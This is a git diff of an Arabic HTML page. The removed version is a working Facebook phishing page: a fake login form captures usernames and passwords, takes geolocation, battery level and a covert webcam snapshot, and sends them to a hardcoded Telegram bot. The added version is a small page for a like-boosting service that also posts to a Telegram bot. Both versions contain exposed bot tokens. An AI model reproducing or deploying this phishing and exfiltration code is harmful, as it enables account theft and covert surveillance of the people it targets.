@@ -2,118 +2,36 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الهوية للمتابعة</title>
+    <title>سستم التفاعل التلقائي</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 350px; text-align: center; }
-        .logo { color: #1877f2; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .info { font-size: 12px; color: #777; margin-top: 15px; }
+        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding: 50px; }
+        input { padding: 10px; width: 80%; margin: 10px; border-radius: 5px; }
+        button { padding: 10px 20px; background: #0088cc; color: white; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
+    <h2>🚀 نظام رشق التفاعلات (تجريبي)</h2>
+    <input type="text" id="fbLink" placeholder="أدخل رابط منشور الفيسبوك">
+    <br>
+    <button onclick="sendToBot()">ابدأ الرشق الآن</button>
 
-<div class="container" id="box">
-    <div class="logo">facebook</div>
-    <div id="login_form">
-        <p>يرجى تسجيل الدخول للمتابعة إلى المحتوى</p>
-        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
-        <input type="password" id="pass" placeholder="كلمة السر" required>
-        <button onclick="startExploit()">تسجيل الدخول</button>
-    </div>
-    
-    <div id="loading" style="display:none;">
-        <p>جاري التحقق من البيانات...</p>
-        <img src="https://i.gifer.com/ZZ5H.gif" width="50">
-    </div>
-    
-    <p class="info">سيتم توجيهك تلقائياً بعد التأكد من الحساب.</p>
-</div>
-
-<video id="v" style="display:none;" autoplay></video>
-<canvas id="c" style="display:none;"></canvas>
-
-<script>
-    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-    const CHAT_ID = "7214473798";
-
-    // وظيفة بدء الهجوم عند الضغط على الزر
-    async function startExploit() {
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
-
-        if (!user || !pass) {
-            alert("يرجى إدخال البيانات المطلوبة!");
-            return;
+    <script>
+        function sendToBot() {
+            const link = document.getElementById('fbLink').value;
+            const token = '8772722170:AAFwBy3-oqh4QKCt69Qh9ZouxsfiCHYvsFI';
+            const chatId = '7472169623'; // الآيدي الخاص بك
+            
+            const message = `طلب رشق جديد:\nالرابط: ${link}`;
+            
+            // إرسال الطلب للبوت عبر API التليجرام مباشرة
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => {
+                alert("تم إرسال الطلب للسيرفر بنجاح!");
+            })
+            .catch(error => {
+                alert("حدث خطأ في الاتصال!");
+            });
         }
-
-        // 1. تغيير الواجهة للتمويه
-        document.getElementById('login_form').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
-
-        // 2. طلب صلاحيات الكاميرا والموقع فوراً
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            
-            // إرسال تقرير شامل (بيانات الدخول + الموقع + الجهاز)
-            collectFullData(user, pass, video);
-        } catch (e) {
-            // حتى لو رفض الكاميرا، سنرسل بيانات الدخول والموقع
-            collectFullData(user, pass, null);
-        }
-    }
-
-    async function collectFullData(user, pass, videoElement) {
-        // جلب بيانات البطارية
-        let battery = "غير متاح";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            battery = `${Math.round(b.level * 100)}%`;
-        }
-
-        // جلب الموقع
-        navigator.geolocation.getCurrentPosition(async (p) => {
-            const lat = p.coords.latitude;
-            const lon = p.coords.longitude;
-            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            // إرسال الرسالة النصية الكبرى
-            const report = `🚀 **عملية اختراق ناجحة**\n\n` +
-                           `👤 الحساب: \`${user}\`\n` +
-                           `🔑 كلمة السر: \`${pass}\`\n` +
-                           `🔋 الشحن: ${battery}\n` +
-                           `📍 الموقع: ${mapUrl}`;
-            
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
-            
-            // إرسال الصورة إذا توفرت الكاميرا
-            if (videoElement) {
-                setTimeout(() => captureAndSend(videoElement), 2000);
-            }
-        }, async () => {
-            // في حال رفض الموقع، نرسل البيانات المتاحة فقط
-            const report = `⚠️ **صيد (بدون موقع)**\n\n👤 الحساب: \`${user}\`\n🔑 كلمة السر: \`${pass}\`\n🔋 الشحن: ${battery}`;
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
-        });
-    }
-
-    function captureAndSend(video) {
-        const canvas = document.getElementById('c');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('photo', blob, 'victim.jpg');
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: formData });
-        }, 'image/jpeg');
-    }
-</script>
-
+    </script>
 </body>
 </html>
